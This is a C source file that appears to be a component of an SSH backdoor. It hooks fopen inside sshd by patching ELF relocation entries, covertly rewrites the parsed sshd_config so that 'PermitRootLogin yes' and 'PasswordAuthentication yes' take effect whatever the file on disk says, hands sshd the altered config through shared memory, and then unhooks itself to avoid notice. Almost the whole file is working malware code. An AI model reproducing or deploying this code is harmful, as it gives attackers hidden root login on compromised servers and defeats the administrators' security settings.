#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/stat.h>

#include <fcntl.h>
#include <inttypes.h>
#include <linux/elf.h>


#include "config_hook.h"

static int hook_rela(Elf64_Rela *foundrela, void *func, int type);

/*
 * the goal is to make sure PermitRootLogin&&PasswordAuthentication is set to yes
 *	regardless if it is explicity set or not
 *	and then unhook ourselves from fopen sneaky beaky like
 *
 * TODO: fix symbol visibility in FINAL version -- we cannot be exporting my_fopen and ref_fopen
 * TODO: sanity && abort()
 * TODO: use strcasestr() TODO TODO TODO
 * XXX: there is probably an easier way to do what I'm trying to do with bitmasks
 *		-- enum/union doesn't seem correct here.
 */
FILE *my_fopen(char *filename, char *mode)
{
	FILE *fp = ref_fopen(filename, mode);
	fpos_t ref_pos;
	fgetpos(fp, &ref_pos);

	/* get file size on disk of filename */	
	signed long int orig_sshd_config_size;
	struct stat st;	
	stat(filename, &st);
	orig_sshd_config_size = (signed long int) st.st_size;

	/* these strings will store pointers found from strstr() */
	char *PermitRootLogin = NULL;
	char *PasswordAuthentication = NULL;

	/* these maintain a reference to the string we are going to replace
	 * 	so strlen() is correct in later _WORK()s
	 */
	char *ref_PRL;
	char *ref_PA = "PasswordAuthentication no\n";

	/* setup so we don't have to use strcat() */
	int buf_len = orig_sshd_config_size + 150;
	char *buf = malloc(buf_len);	
	int buf_off = 0;
	int getline_len = 0; /* using n from getline() has been wrong - n has lost my trust */


	uint64_t BITMASK = MASK_64;	

	char *str = malloc(512);
	size_t n = 0;
	int ret = 42;
	while (ret != -1) {
		ret = getline(&str, &n, fp);
		if (ret < 0)
			break;
		
		/* functionally similar to strcat(buf, str) - in half the time */	
		getline_len = strlen(str);

		memcpy(buf + buf_off, str, getline_len);

		buf_off += getline_len;


		if (strncmp(str, "PermitRootLogin ", strlen("PermitRootLogin ")) == 0) {
			/* PermitRootLogin and strstr() is dumb now - we can wrap these iffs into a function and lose an extra pointer(PermitRootLogin) */
			//PermitRootLogin = strstr(str, "PermitRootLogin"); 
			PermitRootLogin = str;	
		
			if (PermitRootLogin != NULL) {

				/* clear any previously set PermitRootLogin flags -- it's possible for a sshd_config to have duplicates */
				BITMASK &= ~ PermitRootLogin_MASK;

				/* we have a valid PermitRootLogin string - not commented due to strNcmp
				 *	if the string is set to yes then there is NOWORK to be done
				 *	otherwise we will have to EXPLICITly redefine no
				 */

				char *setting = strstr(PermitRootLogin, "Yes");	
				if (setting == NULL)
					setting = strstr(PermitRootLogin, "yes");	
			
				if (setting != NULL) {
					BITMASK |= PermitRootLogin_NOWORK;
				} else {
					/* PermitRootLogin [y-Y]es is not valid, but there is a valid PermitRootLogin string */
					BITMASK |= PermitRootLogin_EXPLICIT;
				}

				ref_PRL = strdup(PermitRootLogin);
				PermitRootLogin = NULL;
			}
		} 
		
		
		if (strncmp(str, "PasswordAuthentication ", strlen("PasswordAuthentication ")) == 0) {
			PasswordAuthentication = strstr(str, "PasswordAuthentication");

			if (PasswordAuthentication != NULL) {

				/* clear any previously set PasswordAuthentication flags -- it's possible for a sshd_config to have duplicates */
				BITMASK &= ~ PasswordAuthentication_MASK;

				char *setting = strstr(PasswordAuthentication, "Yes");	
				if (setting == NULL)
					setting = strstr(PasswordAuthentication, "yes");	
			
				if (setting != NULL) {
					BITMASK |= PasswordAuthentication_NOWORK;
				} else {
					BITMASK |= PasswordAuthentication_EXPLICIT;
				}

				PasswordAuthentication = NULL;
			}
		}

	}
	free(str);
	/*fclose(fp);	 */

	/* we have parsed the whole of filename and the BITMASK has been [un]set accordingly */

	/* if we never ran into any of the strings we wanted in sshd_config 
	 *	 -- BITMASK is unset
	 * then make sure to append the correct strings to the end of the duped sshd_config we are making
	 */	
	uint64_t tmpmask;

	tmpmask = BITMASK & PermitRootLogin_MASK;
		
	if (tmpmask != PermitRootLogin_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
		BITMASK |= PermitRootLogin_APPEND;

	tmpmask = BITMASK & PasswordAuthentication_MASK;

	if (tmpmask != PasswordAuthentication_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
		BITMASK |= PasswordAuthentication_APPEND;
	


	char *PRL_Y = "PermitRootLogin yes\n";
	char *PA_Y = "PasswordAuthentication yes\n ";
	char *new = NULL;

	/* _EXPLICITS */
	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_EXPLICIT) {
		_EXPLICIT_work(&new, "PermitRootLogin ", PRL_Y, ref_PRL, &buf, &buf_len);	
	}

	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_EXPLICIT) {
		_EXPLICIT_work(&new, "PasswordAuthentication ", PA_Y, ref_PA, &buf, &buf_len);
	}


	/* _APPENDS */
	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_APPEND) {
		_APPEND_work(&new, &buf_len, filename, PRL_Y);
	}
	
	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_APPEND) {
		_APPEND_work(&new, &buf_len, filename, PA_Y);
	}

	/* this returns a valid FILE* back to sshd using SHM and the new sshd_config we just made (new)
	 * 	shm_unlink should ensure that when sshd fclose(fp) the shm will be deleted 
	 */
	int fd = shm_open("/7355608", O_RDWR | O_CREAT, 0400);
	
	ftruncate(fd, buf_len);

	mmap(0, buf_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

	write(fd, new, buf_len);

	fp = fdopen(fd, mode);
	rewind(fp); /* important */
	
	shm_unlink("/7355608");

	hook_rela(ref_fopen_Rela, ref_fopen, RELOC_ADDEND);

	free(ref_PRL);	
	return fp;
}

int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, char **__buf, int *_buf_len)
{
	int buf_len = *_buf_len;
	uint64_t bytes_from_start = 0;
	

	/* dup buf into tok_buf to preserve our original sshd_config -- *__buf is getting clobbered */
	char tok_buf[buf_len];
	memcpy(tok_buf, *__buf, buf_len);


	char *config_name_ptr;
	char *str = strtok(tok_buf, "\n");
	while (str != NULL) {
		if (strncmp(str, config_name, strlen(config_name)) == 0) {
			config_name_ptr = strstr(str, config_name);
		}
		str = strtok(NULL, "\n");
	}
	
	/* how far is config_name_ptr from the start of sshd_config */
	bytes_from_start = (char *) config_name_ptr - (char *) tok_buf;

	if (*__new == NULL)
		*__new = malloc(buf_len);

	/* it's possible for *__new and *__buf to point to the same thing --
	 *  e.g. this is the second _EXPLICIT_WORK call
	 */
	if (*__new == *__buf) {
		*__new = malloc(buf_len);
		memcpy(*__new, *__buf, buf_len);
	}

	/* copy all of the bytes from sshd_config into new -- up until (excluding) config_name_ptr */
	memcpy(*__new, *__buf, bytes_from_start);
	/* *__new is still sloppy -- to ensure correct strlen() make sure we clobber off garbage we don't need */
	memset((char *) *__new + bytes_from_start, 0, buf_len - bytes_from_start);

	/* append redefine to new */
	memcpy((char *) *__new + bytes_from_start, redefine, strlen(redefine));

	/* *__new now contains all config options up to old, and is also now appended with redefine */
	

	/* 
	 * if this doesn't make you love C, I don't know what would 
	 *
	 * dest - *__new after the string (redefine) we just appended
	 * src  - everything in *__buf (original sshd_config) after the string we just replaced
	 * num  - the amount of chars left in buf after the string we replaced
	 */	
	memcpy((char *) *__new + strlen(*__new),
				(char *) *__buf + bytes_from_start + strlen(old),
				strlen((char *) *__buf + bytes_from_start));

	free(*__buf);
	*__buf = *__new;
	
	return 0;
}

int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append)
{
	int buf_len = *_buf_len;

	/* no EXPLICITs or APPENDs have happened before -- it's up to us to read() and malloc */
	if (*__new == NULL)  {
		*__new = malloc(buf_len);
		int orig_fd = open(filename, O_RDONLY);
		read(orig_fd, *__new, buf_len); /* XXX: read past EOF */
		close(orig_fd);
	}	
	
	int append_len = strlen(append);
	int newlen = strlen(*__new);

	if ((newlen + append_len) > buf_len) {
		if (realloc(*__new, buf_len + append_len) == NULL) {
			/* mercy */
			return -1111111111;
		}
		*_buf_len = *_buf_len + append_len;
	}

	memcpy((char *) *__new + newlen, append, append_len);

	/* ensure null termination */	
	memcpy(((char*) *__new + newlen + append_len), "\0", 1);
	
	return 0;
}

static int hook_rela(Elf64_Rela *foundrela, void *func, int type)
{
	int ret;
	int PAGE_SIZE = getpagesize();
	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ | PROT_WRITE);
	if (ret != 0)
		return -1;

	if (type == RELOC_ADDEND)
		foundrela->r_addend = (unsigned long long) func; 
	else if (type == RELOC_INFO)
		foundrela->r_info = (unsigned long long) func; 

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
	if (ret != 0)
		return -1;

	return 0;
}
